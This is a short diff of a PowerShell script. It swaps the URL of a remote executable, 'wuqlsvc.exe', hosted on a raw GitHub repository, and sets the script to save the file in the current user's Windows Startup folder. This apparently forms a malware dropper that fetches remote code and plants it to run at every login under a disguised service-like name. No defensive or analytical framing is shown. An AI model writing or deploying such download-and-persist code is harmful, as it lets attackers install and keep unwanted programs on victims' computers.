@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/xzj4/1/refs/heads/main/wuqlsvc.exe"
+$url = "https://raw.githubusercontent.com/xzj4/2/refs/heads/main/wuqlsvc.exe"
 #$destPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wcrnsvc.exe"
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
 $destPath = ".\wuqlsvc.exe"
